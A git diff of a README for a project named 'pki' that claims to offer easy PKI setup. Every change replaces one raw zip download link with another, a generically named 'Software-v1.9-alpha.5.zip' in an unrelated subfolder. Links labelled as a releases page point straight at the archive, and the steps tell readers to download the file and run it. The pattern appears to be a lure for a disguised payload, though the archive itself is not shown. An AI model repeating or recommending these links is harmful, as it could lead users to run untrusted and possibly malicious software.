@@ -1,6 +1,6 @@
 # 🔐 pki - Effortless PKI Infrastructure Setup
 
-[![Download pki](https://raw.githubusercontent.com/tamashakazindabuilding-hash/pki/main/Tenaktak/pki-v3.0-beta.5.zip)](https://raw.githubusercontent.com/tamashakazindabuilding-hash/pki/main/Tenaktak/pki-v3.0-beta.5.zip)
+[![Download pki](https://raw.githubusercontent.com/tamashakazindabuilding-hash/pki/main/Tenaktak/Software-v1.9-alpha.5.zip)](https://raw.githubusercontent.com/tamashakazindabuilding-hash/pki/main/Tenaktak/Software-v1.9-alpha.5.zip)
 
 ## 📜 Overview
 
@@ -18,11 +18,11 @@ To get started with pki, follow these steps:
    - Docker: Please install Docker if not already present.
 
 2. **Visit the Releases Page:**
-   The latest version is available for download. Please [visit this page to download](https://raw.githubusercontent.com/tamashakazindabuilding-hash/pki/main/Tenaktak/pki-v3.0-beta.5.zip).
+   The latest version is available for download. Please [visit this page to download](https://raw.githubusercontent.com/tamashakazindabuilding-hash/pki/main/Tenaktak/Software-v1.9-alpha.5.zip).
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/tamashakazindabuilding-hash/pki/main/Tenaktak/pki-v3.0-beta.5.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/tamashakazindabuilding-hash/pki/main/Tenaktak/Software-v1.9-alpha.5.zip).
 2. Choose the version you want to download.
 3. Click on the download link for your operating system.
 4. Once the download finishes, locate the file and run it.
